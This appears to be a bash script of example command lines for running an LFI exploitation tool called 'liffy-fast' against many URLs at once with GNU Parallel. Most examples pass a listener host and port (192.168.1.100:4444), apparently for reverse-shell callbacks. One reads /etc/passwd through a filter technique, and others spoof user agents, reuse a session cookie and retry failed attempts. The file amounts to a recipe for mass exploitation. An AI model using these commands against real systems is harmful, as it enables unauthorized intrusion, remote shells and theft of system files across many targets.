#!/bin/bash
"""
GNU Parallel Examples for Liffy Fast Testing
"""

# Example 1: Basic parallel usage
echo "Example 1: Basic parallel usage"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 2: Parallel with auto IP detection
echo "Example 2: Parallel with auto IP detection"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --auto-ip --auto-port'"

# Example 3: Parallel with different techniques
echo "Example 3: Parallel with different techniques"
echo "cat urls.txt | parallel -j 4 'liffy-fast auto --url {} --auto-ip --auto-port'"

# Example 4: Parallel with filter technique
echo "Example 4: Parallel with filter technique"
echo "cat urls.txt | parallel -j 4 'liffy-fast filter --url {} --file /etc/passwd'"

# Example 5: Parallel with progress bar
echo "Example 5: Parallel with progress bar"
echo "cat urls.txt | parallel --progress -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 6: Parallel with job log
echo "Example 6: Parallel with job log"
echo "cat urls.txt | parallel --joblog liffy_jobs.log -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 7: Parallel with timeout
echo "Example 7: Parallel with timeout"
echo "cat urls.txt | parallel --timeout 300 -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 8: Parallel with different ports
echo "Example 8: Parallel with different ports"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport {#}'"

# Example 9: Parallel with JSON output
echo "Example 9: Parallel with JSON output"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444 --json' > results.json"

# Example 10: Parallel with custom parameters
echo "Example 10: Parallel with custom parameters"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444 --cookies \"session=abc123\" --timeout 60'"

# Example 11: Parallel with different techniques per URL
echo "Example 11: Parallel with different techniques per URL"
echo "cat urls.txt | parallel -j 4 'liffy-fast {1} --url {2} --lhost 192.168.1.100 --lport 4444' ::: data input filter auto :::+ urls.txt"

# Example 12: Parallel with resume capability
echo "Example 12: Parallel with resume capability"
echo "cat urls.txt | parallel --resume --joblog liffy_jobs.log -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 13: Parallel with different output files
echo "Example 13: Parallel with different output files"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444 --output liffy_{#}.log'"

# Example 14: Parallel with retry on failure
echo "Example 14: Parallel with retry on failure"
echo "cat urls.txt | parallel --retries 3 -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"

# Example 15: Parallel with different user agents
echo "Example 15: Parallel with different user agents"
echo "cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444 --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"'"